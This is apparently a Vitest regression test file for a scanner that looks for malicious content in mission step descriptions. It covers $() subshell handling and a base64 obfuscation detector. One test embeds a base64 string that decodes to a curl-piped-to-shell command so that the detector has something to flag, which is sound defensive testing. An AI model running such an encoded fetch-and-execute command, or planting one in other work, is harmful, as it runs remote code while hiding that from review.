import { describe, it, expect } from 'vitest'
import { scanForMaliciousContent } from '../scanner.mjs'

/**
 * Regression tests for uncovered branches in scanner.mjs:
 *   • isSafeCLIMatch subshell path (branch at line 206 else-arm)
 *     — reached when a $(...) subshell is present in the matched value.
 *   • PowerShell $variable short-circuit inside subshell (line 231 true-arm)
 *   • Empty-firstWord LHS short-circuit inside subshell (line 238 LHS-arm)
 *   • scanBase64DecodedContent finding-emission arm (line 265 true-arm)
 *
 * Existing tests only exercise the backtick-with-separators path of
 * isSafeCLIMatch; the $(...) subshell branch and the base64 obfuscation
 * detector had zero coverage before this file was added.
 */

const mission = (payload) => ({
  version: 'kc-mission-v1',
  name: 'x',
  mission: {
    title: 't',
    steps: [{ description: payload }],
  },
})

const findingTypes = (findings) => findings.map((f) => f.type)

describe('scanForMaliciousContent — $() subshell safe-CLI path', () => {
  it('skips $(kubectl ...) as a safe CLI subshell (subshell path + SAFE_CLI arm)', () => {
    const { findings } = scanForMaliciousContent(
      mission('Try running $(kubectl get pods) to inspect resources.')
    )
    expect(findingTypes(findings)).not.toContain('Command injection: $() in string')
  })

  it('skips $($MyVar.Property) as a PowerShell variable access (not command injection)', () => {
    const { findings } = scanForMaliciousContent(
      mission('PowerShell example: $($env.PATH) prints the search path.')
    )
    expect(findingTypes(findings)).not.toContain('Command injection: $() in string')
  })

  it('skips $() whose parsed segment yields an empty firstWord (LHS short-circuit)', () => {
    // Leading pipe makes seg.split(/[\s\|>]+/) return ['', 'kubectl'],
    // so firstWord === '' and the `!firstWord` LHS arm returns true.
    const { findings } = scanForMaliciousContent(
      mission('Legacy snippet: $(|kubectl get pods) still parses as safe.')
    )
    expect(findingTypes(findings)).not.toContain('Command injection: $() in string')
  })
})

describe('scanForMaliciousContent — base64-encoded command detector', () => {
  it('flags a base64 string that decodes to a curl|sh payload', () => {
    // Buffer.from('curl http://example.com | sh').toString('base64')
    const payload = 'Y3VybCBodHRwOi8vZXhhbXBsZS5jb20gfCBzaA=='
    const { findings } = scanForMaliciousContent(
      mission(`Encoded blob: ${payload} — do not run.`)
    )
    expect(findingTypes(findings)).toContain('Obfuscation: base64-encoded command')
  })
})
